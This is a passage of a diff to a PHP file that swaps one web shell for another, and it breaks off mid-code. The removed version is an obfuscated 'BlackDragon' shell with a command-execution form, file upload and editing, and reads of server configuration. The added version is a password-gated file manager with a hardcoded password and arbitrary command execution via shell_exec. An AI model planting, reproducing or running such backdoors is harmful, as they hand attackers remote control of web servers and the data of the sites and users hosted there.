@@ -1,114 +1,1176 @@
 <?php
- session_start(); error_reporting(0); set_time_limit(0); @ini_set('error_log', 0); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); @ini_set('output_buffering', 0); @ini_set('display_errors', 0); function flash($message, $status, $class, $redirect = false) { if (!empty($_SESSION["message"])) { unset($_SESSION["message"]); } if (!empty($_SESSION["class"])) { unset($_SESSION["class"]); } if (!empty($_SESSION["status"])) { unset($_SESSION["status"]); } $_SESSION["message"] = $message; $_SESSION["class"] = $class; $_SESSION["status"] = $status; if ($redirect) { header('Location: ' . $redirect); exit(); } return true; } function clear() { if (!empty($_SESSION["message"])) { unset($_SESSION["message"]); } if (!empty($_SESSION["class"])) { unset($_SESSION["class"]); } if (!empty($_SESSION["status"])) { unset($_SESSION["status"]); } return true; } function writable($path, $perms){ return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>"; } function perms($path) { $perms = fileperms($path); if (($perms & 0xC000) == 0xC000) { $info = 's'; } elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } else { $info = 'u'; } $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; } function fsize($file) { $a = ["B", "KB", "MB", "GB", "TB", "PB"]; $pos = 0; $size = filesize($file); while ($size >= 1024) { $size /= 1024; $pos++; } return round($size, 2)." ".$a[$pos]; } if (isset($_GET['dir'])) { $path = $_GET['dir']; chdir($_GET['dir']); } else { $path = getcwd(); } $path = str_replace('\\', '/', $path); $exdir = explode('/', $path); function getOwner($item) { if (function_exists("posix_getpwuid")) { $downer = @posix_getpwuid(fileowner($item)); $downer = $downer['name']; } else { $downer = fileowner($item); } if (function_exists("posix_getgrgid")) { $dgrp = @posix_getgrgid(filegroup($item)); $dgrp = $dgrp['name']; } else { $dgrp = filegroup($item); } return $downer . '/' . $dgrp; } if (isset($_POST['newFolderName'])) { if (mkdir($path . '/' . $_POST['newFolderName'])) { flash("Create Folder Successfully!", "Success", "success", "?dir=$path"); } else { flash("Create Folder Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) { if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) { flash("Create File Successfully!", "Success", "success", "?dir=$path"); } else { flash("Create File Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newName']) && isset($_GET['item'])) { if ($_POST['newName'] == '') { flash("You miss an important value", "Ooopss..", "warning", "?dir=$path"); } if (rename($path. '/'. $_GET['item'], $_POST['newName'])) { flash("Rename Successfully!", "Success", "success", "?dir=$path"); } else { flash("Rename Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newContent']) && isset($_GET['item'])) { if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) { flash("Edit Successfully!", "Success", "success", "?dir=$path"); } else { flash("Edit Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newPerm']) && isset($_GET['item'])) { if ($_POST['newPerm'] == '') { flash("You miss an important value", "Ooopss..", "warning", "?dir=$path"); } if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) { flash("Change Permission Successfully!", "Success", "success", "?dir=$path"); } else { flash("Change Permission", "Failed", "error", "?dir=$path"); } } if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) { if (is_dir($_GET['item'])) { if (rmdir($_GET['item'])) { flash("Delete Successfully!", "Success", "success", "?dir=$path"); } else { flash("Delete Failed", "Failed", "error", "?dir=$path"); } } else { if (unlink($_GET['item'])) { flash("Delete Successfully!", "Success", "success", "?dir=$path"); } else { flash("Delete Failed", "Failed", "error", "?dir=$path"); } } } if (isset($_FILES['uploadfile'])) { $total = count($_FILES['uploadfile']['name']); for ($i = 0; $i < $total; $i++) { $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]); } if ($total < 2) { if ($mainupload) { flash("Upload File Successfully! ", "Success", "success", "?dir=$path"); } else { flash("Upload Failed", "Failed", "error", "?dir=$path"); } } else{ if ($mainupload) { flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path"); } else { flash("Upload Failed", "Failed", "error", "?dir=$path"); } } } $dirs = scandir($path); $d0mains = @file("/etc/named.conf", false); if (!$d0mains){ $dom = "Cant read /etc/named.conf"; $GLOBALS["need_to_update_header"] = "true"; }else{ $count = 0; foreach ($d0mains as $d0main){ if (@strstr($d0main, "zone")){ preg_match_all('#zone "(.*)"#', $d0main, $domains); flush(); if (strlen(trim($domains[1][0])) > 2){ flush(); $count++; } } } $dom = "$count Domain"; } ?>
-<html>
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
-  <title><?= $_SERVER['SERVER_NAME'] ?></title>
-</head>
 
-<?php
- goto hauwU; rOBSj: cH8mW: goto hBHZ5; b0ENU: echo $_SERVER["\x53\105\122\126\105\122\137\x53\x4f\106\124\127\101\122\105"]; goto PmEoZ; zb1Q1: goto MOjJo; goto Qynio; u0NY7: m43eT: goto SGtCZ; KB4qQ: goto hLDuT; goto IdZNN; iddw6: Qum7j: goto eaJlv; d93Bd: goto Qum7j; goto uNAaQ; YWdy4: NdufR: goto DGtZ1; Ksgq4: goto BI7RR; goto OcRV8; Qynio: SFn2z: goto LEcZd; sGHdX: MOjJo: goto NjmYP; OzwZv: foreach ($dirs as $dir) { if (!is_dir($dir)) { continue; } ?>
-<tr><td><?php  if ($dir === "\x2e\56") { ?>
-<a class="text-light text-decoration-none"href="?dir=<?php  echo dirname($path); ?>
-"><i class="fa fa-folder-open"></i><?php  echo $dir; ?>
-</a><?php  } elseif ($dir === "\56") { ?>
-<a class="text-light text-decoration-none"href="?dir=<?php  echo $path; ?>
-"><i class="fa fa-folder-open"></i><?php  echo $dir; ?>
-</a><?php  } else { ?>
-<a class="text-light text-decoration-none"href="?dir=<?php  echo $path . "\x2f" . $dir; ?>
-"><i class="fa fa-folder"></i><?php  echo $dir; ?>
-</a><?php  } ?>
-</td><td class="text-light"><?php  echo filetype($dir); ?>
-</td><td class="text-light">-</td><td class="text-light"><?php  echo getOwner($dir); ?>
-</td><td class="text-light"><?php  if (is_writable($path . "\57" . $dir)) { echo "\74\146\x6f\x6e\164\x20\143\x6f\154\x6f\x72\x3d\42\x6c\151\155\145\42\x3e"; } elseif (!is_readable($path . "\x2f" . $dir)) { echo "\74\x66\157\156\x74\x20\143\157\x6c\x6f\x72\x3d\x22\x72\x65\144\x22\76"; } echo perms($path . "\57" . $dir); if (is_writable($path . "\57" . $dir) || !is_readable($path . "\x2f" . $dir)) { } ?>
-</td><td class="text-light"><?php  echo date("\x59\55\x6d\55\144\x20\x68\x3a\151\x3a\x73", filemtime($dir)); ?>
-</td><td><?php  if ($dir != "\x2e" && $dir != "\56\x2e") { ?>
-<div class="btn-group"><a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=rename"><i class="fa fa-edit"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=chmod"><i class="fa fa-file-signature"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href=""onclick='return deleteConfirm("?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=delete")'><i class="fa fa-trash"></i></a></div><?php  } elseif ($dir === "\56") { ?>
-<div class="btn-group"><a class="btn btn-outline-light btn-sm mr-1"href="#newFolderCollapse"aria-controls="newFolderCollapse"aria-expanded="false"data-bs-toggle="collapse"role="button"><i class="fa fa-folder-plus"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="#newFileCollapse"aria-controls="newFileCollapse"aria-expanded="false"data-bs-toggle="collapse"role="button"><i class="fa fa-file-plus"></i></a></div><?php  } ?>
-</td></tr><?php  } goto bq6SH; AFlnu: goto iW19L; goto sGHdX; i7pi8: clear(); goto mWEXw; QCfxl: goto i1FVz; goto u0NY7; hauwU: ?>
-<body class="text-light bg-dark"><?php  goto QCfxl; V_y64: goto SFn2z; goto Os2iL; uNAaQ: iW19L: goto ahWUa; V5PPd: yrxPs: goto cJPTP; eaJlv: echo $dom; goto jolI6; X1MK4: ?>
-[<?php  goto AfeZi; hBHZ5: if (isset($_POST["\x63\157\155\x6d\x61\156\x64"])) { ?>
-<div class="row justify-content-center"><pre></pre></div><?php  } goto WoZVb; LEcZd: ?>
-<br><i class="fa fa-fingerprint"></i> 	<?php  goto d93Bd; hrPom: goto L9AzP; goto iddw6; mXVKb: BI7RR: goto jr7a0; vYro2: echo writable($path, perms($path)); goto AFlnu; sG65p: ?>
-<div class="container-fluid"><div class="py-3"id="main"><div class="bg-dark box p-4 rounded-3 shadow"><div class="mb-3 info"><i class="fa fa-server"></i> 	<?php  goto Ksgq4; neZoz: goto NdufR; goto MZOWk; zQoKp: N_VXD: goto KxtPW; DGtZ1: echo !@$_SERVER["\123\x45\122\126\x45\x52\x5f\x41\x44\104\x52"] ? gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\137\116\101\115\105"]) : @$_SERVER["\123\105\122\x56\105\122\137\x41\x44\104\122"]; goto V_y64; RYS80: ?>
-<div class="row justify-content-center"><div class="collapse"id="newFolderCollapse"data-bs-parent="#tools"style="transition:none"><form action=""method="post"><div class="mb-3"><label class="form-label"for="name">Folder Name</label> <input class="form-control"name="newFolderName"placeholder="BlackDragon"></div><button class="btn btn-outline-light"type="submit">Submit</button></form></div><div class="collapse"id="newFileCollapse"data-bs-parent="#tools"style="transition:none"><form action=""method="post"><div class="mb-3"><label class="form-label"for="name">File Name</label> <input class="form-control"name="newFileName"placeholder="blackdragon.php"></div><div class="mb-3"><label class="form-label"for="name">File Content</label> <textarea class="form-control"name="newFileContent"rows="10"placeholder="Hello World - BlackDragon"></textarea></div><button class="btn btn-outline-light"type="submit">Submit</button></form></div></div><div class="table-responsive"><table class="text-light table table-dark table-hover"><thead><tr><td style="width:35%">Name</td><td style="width:10%">Type</td><td style="width:10%">Size</td><td style="width:13%">Owner/Group</td><td style="width:10%">Permission</td><td style="width:13%">Last Modified</td><td style="width:9%">Actions</td></tr></thead><tbody class="text-nowrap"><?php  goto V9smb; ahWUa: ?>
-] <a class="text-light text-decoration-none"href="?">[ HOME ]</a></div><div class="d-flex justify-content-between"><div class="p-2"><form action=""method="post"><div class="row"><div class="mb-3 col-md-9"><input class="form-control form-control-sm"name="command"placeholder="Command"></div><div class="col-md-3"><button class="btn btn-outline-light btn-sm"type="submit">Exec</button></div></div></form></div><div class="p-2"><form action=""method="post"enctype="multipart/form-data"><div class="row"><div class="mb-3 col-md-9"><input class="form-control form-control-sm"name="uploadfile[]"aria-describedby="inputGroupFileAddon04"aria-label="Upload"id="inputGroupFile04"multiple type="file"></div><div class="col-md-3"><button class="btn btn-outline-light btn-sm"type="submit">Submit</button></div></div></form></div></div><div class="container"id="tools"><?php  goto e_aIQ; AfeZi: goto KMrmS; goto MlxC3; e1LXm: if (isset($_SESSION["\155\145\163\163\x61\147\145"])) { ?>
-Swal.fire(
-      '<?php  echo $_SESSION["\x73\x74\x61\x74\165\x73"]; ?>
-',
-      '<?php  echo $_SESSION["\155\x65\x73\x73\141\147\x65"]; ?>
-',
-      '<?php  echo $_SESSION["\x63\154\141\x73\163"]; ?>
-'
-    )<?php  } goto i7pi8; MZOWk: L9AzP: goto dWrZs; MlxC3: hLDuT: goto b0ENU; O1oBN: goto by7N2; goto mXVKb; WoZVb: goto aXEYD; goto ENKjG; yLkGk: i1FVz: goto sG65p; cJPTP: ?>
-</div><div class="breadcrumb"><i class="fa fa fa-folder pt-1"></i> 	<?php  goto zb1Q1; OcRV8: KMrmS: goto vYro2; SQYC2: goto OEjDD; goto V5PPd; HfCWa: goto zGYeR; goto rOBSj; PmEoZ: goto m43eT; goto kaxVW; kaxVW: by7N2: goto cTtDw; jr7a0: echo php_uname(); goto hrPom; NjmYP: foreach ($exdir as $id => $pat) { if ($pat == '' && $id == 0) { ?>
-<a class="text-light text-decoration-none"href="?dir=/">/</a><?php  } if ($pat == '') { continue; } ?>
-<a class="text-light text-decoration-none"href="?dir=<?php  for ($i = 0; $i <= $id; $i++) { echo "{$exdir[$i]}"; if ($i != $id) { echo "\57"; } } ?>
-"><?php  echo $pat; ?>
-</a><span class="text-light">/</span><?php  } goto HfCWa; dWrZs: ?>
-<br><i class="fa fa-microchip"></i> 	<?php  goto KB4qQ; Os2iL: zGYeR: goto X1MK4; V9smb: goto uErGb; goto zQoKp; e_aIQ: goto cH8mW; goto NY9pR; KxtPW: foreach ($dirs as $dir) { if (!is_file($dir)) { continue; } ?>
-<tr><td><a class="text-light text-decoration-none"href="?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=view"><i class="fa fa-file-code"></i><?php  echo $dir; ?>
-</a></td><td class="text-light"><?php  echo function_exists("\155\x69\x6d\x65\137\x63\x6f\156\x74\x65\156\x74\x5f\164\x79\160\145") ? mime_content_type($dir) : filetype($dir); ?>
-</td><td class="text-light"><?php  echo fsize($dir); ?>
-</td><td class="text-light"><?php  echo getOwner($dir); ?>
-</td><td class="text-light"><?php  if (is_writable($path . "\57" . $dir)) { echo "\x3c\146\157\x6e\x74\x20\143\x6f\x6c\157\x72\x3d\42\x6c\x69\x6d\145\x22\x3e"; } elseif (!is_readable($path . "\x2f" . $dir)) { echo "\x3c\x66\157\x6e\164\x20\143\157\x6c\x6f\x72\75\x22\x72\145\144\x22\76"; } echo perms($path . "\x2f" . $dir); if (is_writable($path . "\x2f" . $dir) || !is_readable($path . "\57" . $dir)) { } ?>
-</td><td class="text-light"><?php  echo date("\131\55\x6d\x2d\144\40\x68\x3a\151\x3a\163", filemtime($dir)); ?>
-</td><td><?php  if ($dir != "\x2e" && $dir != "\x2e\56") { ?>
-<div class="btn-group"><a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=edit"><i class="fa fa-file-edit"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=rename"><i class="fa fa-edit"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href="?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=chmod"><i class="fa fa-file-signature"></i></a> <a class="btn btn-outline-light btn-sm mr-1"href=""onclick='return deleteConfirm("?dir=<?php  echo $path; ?>
-&item=<?php  echo $dir; ?>
-&action=delete")'><i class="fa fa-trash"></i></a></div><?php  } ?>
-</td></tr><?php  } goto O1oBN; oujlf: if (isset($_GET["\x61\x63\164\x69\157\x6e"]) && $_GET["\141\143\164\151\x6f\156"] != "\144\145\x6c\145\164\145") { $action = $_GET["\141\143\164\151\x6f\156"]; ?>
-<div class="row justify-content-center"><?php  if ($action == "\162\x65\156\x61\155\x65" && isset($_GET["\x69\164\x65\x6d"])) { ?>
-<form action=""method="post"><div class="mb-3"><label class="form-label"for="name">New Name</label> <input class="form-control"name="newName"value="<?php  echo $_GET["\x69\164\x65\x6d"]; ?>
-"></div><button class="btn btn-outline-light"type="submit">Submit</button> <button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></form><?php  } elseif ($action == "\145\144\x69\164" && isset($_GET["\x69\164\145\x6d"])) { ?>
-<form action=""method="post"><div class="mb-3"><label class="form-label"for="name"><?php  echo $_GET["\x69\164\x65\x6d"]; ?>
-</label> <textarea class="form-control"name="newContent"rows="10"id="CopyFromTextArea"><?php  echo htmlspecialchars(file_get_contents($path . "\x2f" . $_GET["\x69\x74\145\155"])); ?>
-</textarea></div><button class="btn btn-outline-light"type="submit">Submit</button> <button class="btn btn-outline-light"type="button"onclick="jscopy()">Copy</button> <button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></form><?php  } elseif ($action == "\x76\x69\145\167" && isset($_GET["\151\164\x65\155"])) { ?>
-<div class="mb-3"><label class="form-label"for="name">File Name :<?php  echo $_GET["\151\164\145\155"]; ?>
-</label> <textarea class="form-control"name="newContent"rows="10"disabled><?php  echo htmlspecialchars(file_get_contents($path . "\x2f" . $_GET["\151\x74\145\155"])); ?>
-</textarea><br><button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></div><?php  } elseif ($action == "\143\x68\x6d\157\x64" && isset($_GET["\151\x74\x65\155"])) { ?>
-<form action=""method="post"><div class="mb-3"><label class="form-label"for="name"><?php  echo $_GET["\151\164\x65\155"]; ?>
-</label> <input class="form-control"name="newPerm"value="<?php  echo substr(sprintf("\45\x6f", fileperms($_GET["\151\x74\145\155"])), -4); ?>
-"></div><button class="btn btn-outline-light"type="submit">Submit</button> <button class="btn btn-outline-light"type="button"onclick="history.go(-1)">Back</button></form><?php  } ?>
-</div><?php  } goto SQYC2; bq6SH: goto N_VXD; goto YWdy4; SGtCZ: ?>
-<br><i class="fa fa-satellite-dish"></i> 	<?php  goto neZoz; ENKjG: aXEYD: goto oujlf; IdZNN: OEjDD: goto RYS80; NY9pR: uErGb: goto OzwZv; jolI6: goto yrxPs; goto yLkGk; cTtDw: ?>
-</tbody></table></div><div class="text-light">© BlackDragon<script type="text/javascript">var creditsyear=new Date;document.write(creditsyear.getFullYear())</script></div><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"crossorigin="anonymous"integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"></script><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script><script><?php  goto e1LXm; mWEXw: ?>
-function deleteConfirm(url) {
-      event.preventDefault()
-      Swal.fire({
-          title: 'Are you sure?',
-          icon: 'warning',
-          showCancelButton: true,
-          confirmButtonColor: '#3085d6',
-          cancelButtonColor: '#d33',
-          confirmButtonText: 'Yes, delete it!'
-      }).then((result) => {
-          if (result.isConfirmed) {
-            window.location.href = url
+
+session_start();
+
+// Güvenlik Ayarları
+define('ADMIN_PASSWORD', 'Cuan1212@@!!'); // Üretimde hash kullanın
+define('MAX_FILE_SIZE', 100 * 1024 * 1024); // 100MB
+define('ALLOWED_EXTENSIONS', array('txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'jpg', 'png', 'gif', 'pdf'));
+
+// CSRF Token Oluştur
+function generateCSRFToken() {
+    if (!isset($_SESSION['csrf_token'])) {
+        // PHP 5.x uyumlu rastgele byte üretimi
+        if (function_exists('openssl_random_pseudo_bytes')) {
+            $_SESSION['csrf_token'] = bin2hex(openssl_random_pseudo_bytes(32));
+        } elseif (function_exists('mcrypt_create_iv')) {
+            $_SESSION['csrf_token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
+        } else {
+            // Fallback: daha az güvenli ama çalışır
+            $_SESSION['csrf_token'] = bin2hex(sha1(uniqid(mt_rand(), true) . microtime(true), true));
         }
-      })
     }
-    function jscopy() {
-      var jsCopy = document.getElementById("CopyFromTextArea");
-      jsCopy.focus();
-      jsCopy.select();
-      document.execCommand("copy");
-    }</script></body>
+    return $_SESSION['csrf_token'];
+}
+
+// PHP 5.x uyumlu hash_equals implementasyonu
+if (!function_exists('hash_equals')) {
+    function hash_equals($known_string, $user_string) {
+        if (strlen($known_string) !== strlen($user_string)) {
+            return false;
+        }
+        $result = 0;
+        for ($i = 0; $i < strlen($known_string); $i++) {
+            $result |= ord($known_string[$i]) ^ ord($user_string[$i]);
+        }
+        return $result === 0;
+    }
+}
+
+// CSRF Token Doğrula
+function validateCSRFToken($token) {
+    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
+}
+
+// Güvenli Path Fonksiyonu
+function securePath($path, $baseDir = null) {
+    if ($baseDir === null) {
+        $baseDir = realpath($_SERVER['DOCUMENT_ROOT']);
+    }
+    
+    $realPath = realpath($path);
+    
+    if ($realPath === false) {
+        return false;
+    }
+    
+    // Path traversal saldırılarına karşı koruma
+    if (strpos($realPath, $baseDir) !== 0) {
+        return false;
+    }
+    
+    return $realPath;
+}
+
+// Kullanıcı Doğrulama
+$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+
+// Giriş İşlemi
+if (!$isAuthenticated && isset($_POST['password']) && isset($_POST['csrf_token'])) {
+    if (validateCSRFToken($_POST['csrf_token'])) {
+        if ($_POST['password'] === ADMIN_PASSWORD) {
+            $_SESSION['authenticated'] = true;
+            $_SESSION['login_time'] = time();
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $loginError = "Hatalı şifre!";
+        }
+    } else {
+        $loginError = "Geçersiz istek!";
+    }
+}
+
+// Çıkış İşlemi
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Dosya Boyutu Format
+function formatSize($bytes) {
+    $units = array('B', 'KB', 'MB', 'GB', 'TB');
+    $bytes = max($bytes, 0);
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow = min($pow, count($units) - 1);
+    $bytes /= pow(1024, $pow);
+    return round($bytes, 2) . ' ' . $units[$pow];
+}
+
+// Dosya İkon Belirleme
+function getFileIcon($filename) {
+    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    $icons = array(
+        'php' => 'file-code',
+        'html' => 'file-code',
+        'css' => 'file-code',
+        'js' => 'file-code',
+        'json' => 'file-code',
+        'txt' => 'file-text',
+        'pdf' => 'file-text',
+        'jpg' => 'image',
+        'jpeg' => 'image',
+        'png' => 'image',
+        'gif' => 'image',
+        'zip' => 'file-archive',
+        'rar' => 'file-archive',
+    );
+    return isset($icons[$extension]) ? $icons[$extension] : 'file';
+}
+
+// Sistem Bilgileri
+function getSystemInfo() {
+    $currentPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    return array(
+        'os' => PHP_OS,
+        'server' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Bilinmiyor',
+        'php_version' => phpversion(),
+        'current_user' => get_current_user(),
+        'server_ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Bilinmiyor',
+        'disk_free' => disk_free_space('/'),
+        'disk_total' => disk_total_space('/'),
+        'writable' => is_writable($currentPath),
+        'functions' => array(
+            'exec' => function_exists('exec'),
+            'shell_exec' => function_exists('shell_exec'),
+            'system' => function_exists('system'),
+        )
+    );
+}
+
+// Mevcut URL'i Oluştur
+function getCurrentURL($currentPath, $isFile = false) {
+    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
+    $relativePath = str_replace($docRoot, '', $currentPath);
+    $relativePath = str_replace("\\", "/", $relativePath);
+    
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    
+    if ($isFile) {
+        // Dosya ise direkt dosya yolunu göster
+        return $protocol . '://' . $host . $relativePath;
+    } else {
+        // Klasör ise sonuna / ekle
+        $relativePath = rtrim($relativePath, '/');
+        return $protocol . '://' . $host . $relativePath . '/';
+    }
+}
+
+if ($isAuthenticated) {
+    $baseDir = realpath($_SERVER['DOCUMENT_ROOT']);
+    $currentPath = isset($_GET['path']) ? securePath($_GET['path'], $baseDir) : $baseDir;
+    
+    if ($currentPath === false) {
+        $currentPath = $baseDir;
+    }
+
+    // Dosya İşlemleri
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token'])) {
+        if (!validateCSRFToken($_POST['csrf_token'])) {
+            $error = "Geçersiz CSRF token!";
+        } else {
+            // Dosya Yükleme
+            if (isset($_FILES['upload_file'])) {
+                $uploadFile = $_FILES['upload_file'];
+                $targetPath = $currentPath . '/' . basename($uploadFile['name']);
+                
+                if ($uploadFile['size'] > MAX_FILE_SIZE) {
+                    $error = "Dosya boyutu çok büyük! Maksimum: " . formatSize(MAX_FILE_SIZE);
+                } elseif (move_uploaded_file($uploadFile['tmp_name'], $targetPath)) {
+                    $success = "Dosya başarıyla yüklendi!";
+                } else {
+                    $error = "Dosya yükleme hatası!";
+                }
+            }
+            
+            // Yeni Klasör Oluşturma
+            if (isset($_POST['create_folder'])) {
+                $folderName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['folder_name']);
+                $newFolder = $currentPath . '/' . $folderName;
+                
+                if (mkdir($newFolder, 0755)) {
+                    $success = "Klasör başarıyla oluşturuldu!";
+                } else {
+                    $error = "Klasör oluşturma hatası!";
+                }
+            }
+            
+            // Yeni Dosya Oluşturma
+            if (isset($_POST['create_file'])) {
+                $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['file_name']);
+                $newFile = $currentPath . '/' . $fileName;
+                
+                if (file_put_contents($newFile, '') !== false) {
+                    $success = "Dosya başarıyla oluşturuldu!";
+                } else {
+                    $error = "Dosya oluşturma hatası!";
+                }
+            }
+            
+            // Dosya Düzenleme
+            if (isset($_POST['edit_file']) && isset($_POST['file_path'])) {
+                $editPath = securePath($_POST['file_path'], $baseDir);
+                if ($editPath !== false && is_file($editPath)) {
+                    if (file_put_contents($editPath, $_POST['file_content']) !== false) {
+                        $success = "Dosya başarıyla kaydedildi!";
+                        $editPath = $_POST['file_path']; // Keep in edit mode
+                    } else {
+                        $error = "Dosya kaydetme hatası!";
+                    }
+                }
+            }
+            
+            // Dosya/Klasör Silme
+            if (isset($_POST['delete']) && isset($_POST['delete_path'])) {
+                $deletePath = securePath($_POST['delete_path'], $baseDir);
+                if ($deletePath !== false) {
+                    if (is_dir($deletePath)) {
+                        if (rmdir($deletePath)) {
+                            $success = "Klasör başarıyla silindi!";
+                        } else {
+                            $error = "Klasör boş değil veya silinemedi!";
+                        }
+                    } elseif (is_file($deletePath)) {
+                        if (unlink($deletePath)) {
+                            $success = "Dosya başarıyla silindi!";
+        } else {
+                            $error = "Dosya silme hatası!";
+                        }
+                    }
+                }
+            }
+            
+            // Yeniden Adlandırma
+            if (isset($_POST['rename']) && isset($_POST['old_path']) && isset($_POST['new_name'])) {
+                $oldPath = securePath($_POST['old_path'], $baseDir);
+                $newName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['new_name']);
+                $newPath = dirname($oldPath) . '/' . $newName;
+                
+                if ($oldPath !== false && rename($oldPath, $newPath)) {
+                    $success = "İsim başarıyla değiştirildi!";
+                } else {
+                    $error = "İsim değiştirme hatası!";
+                }
+            }
+            
+            // Chmod İşlemi
+            if (isset($_POST['chmod']) && isset($_POST['chmod_path']) && isset($_POST['permissions'])) {
+                $chmodPath = securePath($_POST['chmod_path'], $baseDir);
+                $perms = octdec($_POST['permissions']);
+                
+                if ($chmodPath !== false && chmod($chmodPath, $perms)) {
+                    $success = "İzinler başarıyla değiştirildi!";
+        } else {
+                    $error = "İzin değiştirme hatası!";
+                }
+            }
+            
+            // Komut Çalıştırma (Dikkatli kullanın!)
+            if (isset($_POST['run_command']) && isset($_POST['command'])) {
+                $command = $_POST['command'];
+                $output = shell_exec($command . " 2>&1");
+                $commandOutput = $output;
+            }
+        }
+    }
+    
+    // Dosya İndirme
+    if (isset($_GET['download'])) {
+        $downloadPath = securePath($_GET['download'], $baseDir);
+        if ($downloadPath !== false && is_file($downloadPath)) {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
+            header('Content-Length: ' . filesize($downloadPath));
+            readfile($downloadPath);
+        exit;
+    }
+}
+
+    // Dizin Listesi
+    $items = array();
+    if (is_dir($currentPath)) {
+        $scan = scandir($currentPath);
+        foreach ($scan as $item) {
+            if ($item === '.' || $item === '..') continue;
+            
+            $itemPath = $currentPath . '/' . $item;
+            $items[] = array(
+                'name' => $item,
+                'path' => $itemPath,
+                'type' => is_dir($itemPath) ? 'folder' : 'file',
+                'size' => is_file($itemPath) ? filesize($itemPath) : 0,
+                'modified' => filemtime($itemPath),
+                'permissions' => substr(sprintf('%o', fileperms($itemPath)), -4),
+                'icon' => is_dir($itemPath) ? 'folder' : getFileIcon($item)
+            );
+        }
+        
+        // Sıralama: Klasörler önce
+        usort($items, function($a, $b) {
